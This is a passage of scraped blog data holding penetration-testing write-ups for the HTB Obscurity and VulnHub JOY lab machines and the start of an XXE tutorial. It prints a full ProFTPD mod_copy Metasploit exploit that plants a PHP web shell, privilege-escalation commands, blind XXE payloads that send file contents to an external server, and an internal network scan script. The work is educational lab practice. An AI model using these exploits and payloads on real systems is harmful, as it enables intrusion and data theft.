input(&quot;Enter username: &quot;) passW = input(&quot;Enter password: &quot;) with open(&#x27;/etc/shadow&#x27;, &#x27;r&#x27;) as f: data = f.readlines() data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data] passwords = [] for x in data: if not x == None: passwords.append(x) passwordFile = &#x27;\\n&#x27;.join([&#x27;\\n&#x27;.join(p) for p in passwords]) with open(&#x27;/tmp/SSH/&#x27;+path, &#x27;w&#x27;) as f: f.write(passwordFile) time.sleep(.1) salt = &quot;&quot; realPass = &quot;&quot; for p in passwords: if p[0] == session[&#x27;user&#x27;]: salt, realPass = p[1].split(&#x27;$&#x27;)[2:] break if salt == &quot;&quot;: print(&quot;Invalid user&quot;) os.remove(&#x27;/tmp/SSH/&#x27;+path) sys.exit(0) salt = &#x27;$6$&#x27;+salt+&#x27;$&#x27; realPass = salt + realPass hash = crypt.crypt(passW, salt) if hash == realPass: print(&quot;Authed!&quot;) session[&#x27;authenticated&#x27;] = 1 else: print(&quot;Incorrect pass&quot;) os.remove(&#x27;/tmp/SSH/&#x27;+path) sys.exit(0) os.remove(os.path.join(&#x27;/tmp/SSH/&#x27;,path))except Exception as e: traceback.print_exc() sys.exit(0)if session[&#x27;authenticated&#x27;] == 1: while True: command = input(session[&#x27;user&#x27;] + &quot;@Obscure$ &quot;) cmd = [&#x27;sudo&#x27;, &#x27;-u&#x27;, session[&#x27;user&#x27;]] cmd.extend(command.split(&quot; &quot;)) proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) o,e = proc.communicate() print(&#x27;Output: &#x27; + o.decode(&#x27;ascii&#x27;)) print(&#x27;Error: &#x27; + e.decode(&#x27;ascii&#x27;)) if len(e.decode(&#x27;ascii&#x27;)) &gt; 0 else print(&#x27;&#x27;) 现在已知条件是明文check.txt，密文out.txt，以及加密算法encrypt，求解密钥，爆破Python代码如下： 12345678910111213141516import stringwith open(&#x27;check.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: mingwen = f.read()key = &#x27;&#x27;with open(&#x27;out.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: miwen = f.read() for c in range(len(mingwen)): for i in range(255): ch = chr((ord(miwen[c]) - i) % 255) if ch == mingwen[c]: key += chr(i) breakprint(key) 得到密钥alexandrovich，解密passwordreminder.txt： 使用这个密码登录robert的SSH终端，获得user.txt。 sudo -l查看能够以root身份执行的命令： 123456robert@obscure:~$ sudo -lMatching Defaults entries for robert on obscure: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser robert may run the following commands on obscure: (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;home&#x2F;robert&#x2F;BetterSSH&#x2F;BetterSSH.py 审计源码发现关键点： 1234567891011with open(&#x27;/etc/shadow&#x27;, &#x27;r&#x27;) as f: data = f.readlines()data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]passwords = []for x in data: if not x == None: passwords.append(x)passwordFile = &#x27;\\n&#x27;.join([&#x27;\\n&#x27;.join(p) for p in passwords])with open(&#x27;/tmp/SSH/&#x27;+path, &#x27;w&#x27;) as f: f.write(passwordFile) 程序会将 /etc/shadow 写入到 /tmp/SSH 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可 123456import shutilimport oswhile True: files = os.listdir(&quot;./SSH&quot;) for file in files: shutil.copy(os.path.join(&quot;./SSH&quot;, file), &quot;./flag&quot;); 然后我们执行就会发现 flag 目录中存在文件 再用John光速解密得到mercedes，提权 还有一种更常规的提权方法： 123456if session[&#x27;authenticated&#x27;] == 1: while True: command = input(session[&#x27;user&#x27;] + &quot;@Obscure$ &quot;) cmd = [&#x27;sudo&#x27;, &#x27;-u&#x27;, session[&#x27;user&#x27;]] cmd.extend(command.split(&quot; &quot;)) proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) sudo -u robert -u root会覆盖前面一个-u的参数值。 0x04 Summary Obscurity靶机是我做的第一个不是CVE类型的靶机，源码审计起来有些吃力，多看看这种类型的应该会好一些。首先是服务器源码存在命令注入，可以执行系统命令从而反弹shell，以www-data的身份登录靶机。然后作者提供了一个密文、明文以及加解密算法，让我们写脚本爆破出密钥，通过这个密钥得到robert用户的登录密码，得到user.txt。然后在BetterSSH.py中存在两处可以利用的漏洞，第一处漏洞有点类似于条件竞争，用一个死循环的脚本把BetterSSH.py从/etc/shadow复制到/tmp/SSH的文件再次复制到一个自定义的目录下面，从而得到root的密码。第二处漏洞，虽然-u参数指定了当前用户的权限执行命令，但是用户输入的第二个-u root可以覆盖掉第一个-u参数从而绕过。总的来说，审计代码和编写代码的能力都有待加强。 0x05 Reference https://www.leavesongs.com/PYTHON/python-shell-backdoor.html","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"VulnHub::DigitalWorld.Local:JOY Walkthrough","date":"2020-02-29T04:08:00.000Z","path":"Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough/","text":"VulnHub::DigitalWorld.Local:JOY Walkthrough 0x01 Introduction Does penetration testing spark joy? If it does, this machine is for you. This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this. This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder. 😃 If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Joy is (#1): https://www.youtube.com/watch?v=9AvWs2X-bEA, (#2): something that should be replicated, (#3): what happens when you clean out seemingly “hidden” closets. Note: There are at least two reliable ways of obtaining user privileges and rooting this machine. Have fun. 😃 Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment. Download Link：https://www.vulnhub.com/entry/digitalworldlocal-joy,298/ 0x02 Tools and Tips Scanning Nmap Enumeration FTP anonymous login Exploit Exploit proftpd using Metasploit Privilege Escalation Sudo right 0x03 Pentesting 扫描网段，发现靶机IP地址192.168.0.108： 扫描靶机端口： 发现FTP是可以匿名登录的，直接使用FileZilla工具登录站点查看文件 一路看下来发现directory文件列出了/home/patrick目录下的所有文件，剔除一些常见的和随机生成的文件之外，就剩下verison_control值得看一看，用下面的命令把文件复制到FTP站点目录： telnet和ftp命令的区别： telnet连接后，用户主机实际成为远程TELNET服务器的一个虚拟终端（或称是哑终端），一切服务完全在远程服务器上执行，但用户决不能从远程服务器中下载或上传文件，或拷贝文件到用户主机中来。 ftp则不同，它是采用客户机/服务器模式，用户能够操作FTP服务器中的目录，上传或下载文件，但用户不能请求服务器执行某个文件。 version_control文件如下： 123456789101112Version Control of External-Facing Services:Apache: 2.4.25Dropbear SSH: 0.34ProFTPd: 1.3.5Samba: 4.5.12We should switch to OpenSSH and upgrade ProFTPd.Note that we have some other configurations in this machine.1. The webroot is no longer &#x2F;var&#x2F;www&#x2F;html. We have changed it to &#x2F;var&#x2F;www&#x2F;tryingharderisjoy.2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out. 提示我们ProFTP需要升级，我们先从这入手： 直接上Metasploit： 返回一个标准Shell： 查看当前目录下有哪些文件： 有一个L37ISF8.php文件是刚刚exp生成的，接着看ossec目录： 有一个比较可疑的文件patricksecretsofjoy： 有patrick用户的登录密码，root的密码算是作者的恶搞吧。直接登录patrick用户，尝试提权： 到这里就有两种思路用来提权： 利用/home/patrick/script/test的脚本文件来更改/etc/passwd的权限，进而修改patrick用户的权限； 上传自己编写的脚本至相同的目录。这里就文字叙述一下具体过程： a) 首先在本机上编写Shell脚本echo &quot;awk 'BEGIN &#123;system(\\&quot;/bin/bash\\&quot;)&#125;'&quot; &gt; test； b) 再使用ftp上传到upload目录： 123ftp 192.168.0.108cd uploadput test c) 再使用telnet传入到/home/patrick/script 123telnet 192.168.0.108 21site cpfr &#x2F;home&#x2F;ftp&#x2F;upload&#x2F;testsite cpto &#x2F;home&#x2F;patrick&#x2F;script&#x2F;test d) 再执行test文件sudo /home/patrick/script/test 相对而言第一个思路会比较简单，修改权限： 修改Patrick用户的uid和gid： 这里可以直接登录靶机用nano修改，但是如何在主机上的反弹shell修改呢？因为反弹shell不支持vim, vi, nano等交互式窗口，但是别忘了还有一个sed命令可以用来编辑文件，sed '36,36s/1000:1000/0:0/g' /etc/passwd，上面这个命令表示修改/etc/passwd文件中的第36行，把1000:1000替换成0:0 重新登录一下就可以获得root权限了： 0x04 ProFTP 1.3.5 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148### This module requires Metasploit: http://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require &#x27;msf/core&#x27;class Metasploit3 &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::Tcp include Msf::Exploit::Remote::HttpClient def initialize(info = &#123;&#125;) super(update_info(info, &#x27;Name&#x27; =&gt; &#x27;ProFTPD 1.3.5 Mod_Copy Command Execution&#x27;, &#x27;Description&#x27; =&gt; %q&#123; This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. The copy commands are executed with the rights of the ProFTPD service, which by default runs under the privileges of the &#x27;nobody&#x27; user. By using /proc/self/cmdline to copy a PHP payload to the website directory, PHP remote code execution is made possible. &#125;, &#x27;Author&#x27; =&gt; [ &#x27;Vadim Melihow&#x27;, # Original discovery, Proof of Concept &#x27;xistence &lt;xistence[at]0x90.nl&gt;&#x27; # Metasploit module ], &#x27;License&#x27; =&gt; MSF_LICENSE, &#x27;References&#x27; =&gt; [ [ &#x27;CVE&#x27;, &#x27;2015-3306&#x27; ], [ &#x27;EDB&#x27;, &#x27;36742&#x27; ] ], &#x27;Privileged&#x27; =&gt; false, &#x27;Platform&#x27; =&gt; [ &#x27;unix&#x27; ], &#x27;Arch&#x27; =&gt; ARCH_CMD, &#x27;Payload&#x27; =&gt; &#123; &#x27;BadChars&#x27; =&gt; &#x27;&#x27;, &#x27;Compat&#x27; =&gt; &#123; &#x27;PayloadType&#x27; =&gt; &#x27;cmd&#x27;, &#x27;RequiredCmd&#x27; =&gt; &#x27;generic gawk bash python perl&#x27; &#125; &#125;, &#x27;Targets&#x27; =&gt; [ [ &#x27;ProFTPD 1.3.5&#x27;, &#123; &#125; ] ], &#x27;DisclosureDate&#x27; =&gt; &#x27;Apr 22 2015&#x27;, &#x27;DefaultTarget&#x27; =&gt; 0)) register_options( [ OptPort.new(&#x27;RPORT&#x27;, [true, &#x27;HTTP port&#x27;, 80]), OptPort.new(&#x27;RPORT_FTP&#x27;, [true, &#x27;FTP port&#x27;, 21]), OptString.new(&#x27;TARGETURI&#x27;, [true, &#x27;Base path to the website&#x27;, &#x27;/&#x27;]), OptString.new(&#x27;TMPPATH&#x27;, [true, &#x27;Absolute writable path&#x27;, &#x27;/tmp&#x27;]), OptString.new(&#x27;SITEPATH&#x27;, [true, &#x27;Absolute writable website path&#x27;, &#x27;/var/www&#x27;]) ], self.class) end def check ftp_port = datastore[&#x27;RPORT_FTP&#x27;] sock = Rex::Socket.create_tcp(&#x27;PeerHost&#x27; =&gt; rhost, &#x27;PeerPort&#x27; =&gt; ftp_port) if sock.nil? fail_with(Failure::Unreachable, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;) else print_status(&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;) end res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;220&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;) end sock.puts(&quot;SITE CPFR /etc/passwd\\r\\n&quot;) res = sock.get_once(-1, 10) if res &amp;&amp; res.include?(&#x27;350&#x27;) Exploit::CheckCode::Vulnerable else Exploit::CheckCode::Safe end end def exploit ftp_port = datastore[&#x27;RPORT_FTP&#x27;] get_arg = rand_text_alphanumeric(5+rand(3)) payload_name = rand_text_alphanumeric(5+rand(3)) + &#x27;.php&#x27; sock = Rex::Socket.create_tcp(&#x27;PeerHost&#x27; =&gt; rhost, &#x27;PeerPort&#x27; =&gt; ftp_port) if sock.nil? fail_with(Failure::Unreachable, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;) else print_status(&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;) end res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;220&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;) end print_status(&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Sending copy commands to FTP server&quot;) sock.puts(&quot;SITE CPFR /proc/self/cmdline\\r\\n&quot;) res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;350&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from /proc/self/cmdline&quot;) end sock.put(&quot;SITE CPTO #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru($_GET[\\&#x27;#&#123;get_arg&#125;\\&#x27;]);?&gt;\\r\\n&quot;) res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;250&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying to temporary payload file&quot;) end sock.put(&quot;SITE CPFR #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru($_GET[\\&#x27;#&#123;get_arg&#125;\\&#x27;]);?&gt;\\r\\n&quot;) res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;350&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from temporary payload file&quot;) end sock.put(&quot;SITE CPTO #&#123;datastore[&#x27;SITEPATH&#x27;]&#125;/#&#123;payload_name&#125;\\r\\n&quot;) res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;250&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying PHP payload to website path, directory not writable?&quot;) end sock.close print_status(&quot;#&#123;peer&#125; - Executing PHP payload #&#123;target_uri.path&#125;#&#123;payload_name&#125;&quot;) res = send_request_cgi!( &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, payload_name), &#x27;method&#x27; =&gt; &#x27;GET&#x27;, &#x27;vars_get&#x27; =&gt; &#123; get_arg =&gt; &quot;nohup #&#123;payload.encoded&#125; &amp;&quot; &#125; ) unless res &amp;&amp; res.code == 200 fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure executing payload&quot;) end endend","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"靶机/VulnHub","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/VulnHub/"}]},{"title":"Web安全学习之XXE漏洞利用","date":"2020-02-26T09:42:56.000Z","path":"Web_security/basic_learning/20.xxe漏洞利用/","text":"Web安全学习之XXE漏洞利用 什么是XXE XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击（那为啥不叫XEE）。对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。 XML（Extensible Markup Language）英文直译就是可扩展标记语言，“标记” 是指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。 如果把 HTML 和 XML 进行对比的话， HTML 旨在显示数据信息，而 XML 旨在传输数据信息。（说到传输数据自然而然肯定会想到json格式，相比XML，现在用的更多是json格式来传输数据） XML基本知识 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;ca01h&lt;/to&gt;&lt;from&gt;njupt&lt;/from&gt;xml&lt;/note&gt; 在上面代码中的第一行，定义XML的版本与编码。 在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。 同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。 实体 所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。 实体总共有四种，分别是： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities) 其中内置实体和字符实体都和 HTML 的实体编码类似，但如果从另一个角度看，实体完全可以分成两个派别：通用实体和参数实体。 DTD XML的语言规范是由DTD（Document Type Definition）来控制，类似编程语言的语法，它定义了XML文档的合法构建模块，即声明了XML的内容格式规范。 DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 dtd 文件。 内部引用 下面是一个内部DTD的XML示例： 123456789101112&lt;!--XML声明--&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!--DTD，文档类型声明--&gt;&lt;!DOCTYPE note [ #定义此文档是note类型&lt;!ELEMENT note (body)&gt; #定义note元素有一个元素：&quot;body&quot;&lt;!ELEMENT body (#PCDATA)&gt; #定义body元素为&quot;#PCDATA&quot;类型&lt;!ENTITY writer &quot;hello world&quot;&gt; #定义一个内部实体]&gt;&lt;!--文档元素--&gt; &lt;note&gt;&lt;body&gt;&amp;writer;&lt;&#x2F;body&gt;&lt;&#x2F;note&gt; 上面第7行定义了一个内部实体，第11行中对上面定义的writer实体进行了引用，到时候输出的时候&amp;writer就会被&quot;hello world&quot;替换。 1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 一个实体由三部分构成:&amp;符号, 实体名称, 分号 (😉，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号 外部引用 通用实体 下面再来看看一个外部DTD的XML示例： 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; #定义元素为ANY，即可以接受任何元素。&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;&lt;root&gt;&lt;body&gt;&amp;xxe;&lt;&#x2F;body&gt; #定义一个外部实体&lt;&#x2F;root&gt; 通过第 4 行的定义， 第 7 行的 &amp;xxe 就会对 c:/test.dtd 文件资源进行 SYSTEM 关键字的引用，这样对引用资源所做的任何更改都会在文档中自动更新。 另外除了上面 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式，语法如下： 1&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt; 这个在我们的攻击中也可以起到和 SYSTEM 一样的作用，但实际上实体远不止这一种，我们以上涉及的实体只是其中的一种，被称为通用实体。 参数实体 123&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt;%an-element; %remote-dtd; 在上面的代码示例中，可以看到实体名前多了一个 “%” ，在参数实体中使用 “% 实体名” (这里面的空格不能少) 定义，并且只能在 DTD 中使用 “% 实体名” 引用。 另外和通用实体一样，参数实体也可以外部引用，同时只有在 DTD 文件中，参数实体的声明才能引用其他实体。 XML注入 下面是一个普通的XML注入例子： 123# 注入前XML代码&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;用户输入位置&lt;&#x2F;USER&gt; 当用户输入一些恶意代码，比如User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2，原XML代码就变成了下面的样子： 1234# 注入后XML代码&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;User1&lt;&#x2F;USER&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;User2&lt;&#x2F;USER&gt; 可以看到通过XML语句的前后拼接， XML代码被插入了进去。 对普通的 XML 注入，利用面比较狭窄，现实中也是比较鸡肋的存在，因此几乎用不到，如果有的话应该也是逻辑漏洞，下面就重点介绍XXE的利用。 XXE利用 实验环境 目标靶机： IP：192.168.0.104 环境：Win7+phpStudy+apache+php 本地主机： IP：192.168.0.108 环境：Win10+phpStudy+apache+BurpSuite+Python3 有回显读本地敏感文件（Normal XXE） 目标靶机：xxe_test.php 1234567&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds;?&gt; 在C盘下新建一个flag.txt，内容我设置成了XXE Payload Executed Successfully!!!。 本地主机：payload 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE creds [&lt;!ENTITY goodies SYSTEM &quot;file:///c:/flag.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt; 如果flag.txt中包含特殊符号，比如&lt;&gt;&amp;&quot;'等，例如： 1&lt;XXE Payload Executed Successfully!!!&gt; 可以看到当被读取文件中含有特殊符号时，返回了一堆错误，这个时候就需要使用CDATA了。（当然，更简单的使用base64编码） 什么是CDATA： CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。 CDATA 部分由&quot;&lt;![CDATA[&quot;开始，由&quot;]]&gt;&quot;结束 简单一点的来说，将脚本代码定义为CDATA后，CDATA部分中的内容就会被解析器忽略，这个时候就可以读取文件了。 本地主机：CDATA Payload 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt; 本地主机：evil.dtd 12&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; 利用带有CDATA的Payload，可以看到特殊符号被成功绕过。 但是在真实情况下，服务器上的XML一般用于配置文件或者传输数据，而不是显示数据，因此在现实环境下利用这个漏洞就需要找到不依靠回显的方法。 无回显读取本地敏感文件（Blind XXE） payload1 目标靶机：xxe_blind_test.php 123456&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);?&gt; 本地主机：Payload 1234&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt;%remote;%int;%send;]&gt; 本地主机：evil.dtd 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.97.199.89:9999?p&#x3D;%file;&#39;&gt;&quot;&gt; 结果如下： 看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法，不编码会报错）。 目标靶机的网络出了点问题，IP地址换成了192.168.50.130 现在我们再来回顾一下Payload的调用过程： 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 evil.dtd ，有点类似于将 evil.dtd 包含进来，然后 %int 调用 evil.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，解决了 XXE 无回显的问题。 payload2 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;&#x2F;value&gt; 在我的vps的xxe.xml的内容如下： 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;yourvps&#x2F;%file;&#39;&gt;&quot;&gt; 而测试文件TEST.txt内容为： 1chybeta 整个的调用过程如下：解析时%dtd引入xxe.xml，之后%all引入send的定义，最后引用了实体send，把%file文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log： 若要读取php等文件，同样需要先经过base64加密下。 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;&#x2F;value&gt; 思考 我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。 所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议： HTTP内网探测主机 下面是探测脚本inhostscan.py： 1234567891011121314151617181920212223import requestsimport base64def XXE(ip,string): try: xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot; &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot; x = requests.post(&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;, data=xml, headers=headers, timeout=5).text coded_string = x.split(&#x27; &#x27;)[-2] print(&#x27; [+]&#x27;,ip,&#x27;Successfully Found !!!&#x27;) except: print(&#x27; [-]&#x27;,ip,&#x27;Error Not Found !!!&#x27;) pass if __name__ == &#x27;__main__&#x27;: headers = &#123;&#x27;Content-Type&#x27;:&#x27;application/xml&#x27;&#125; for i in range(1,255): ip = &#x27;192.168.50.&#x27; + str(i) string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + 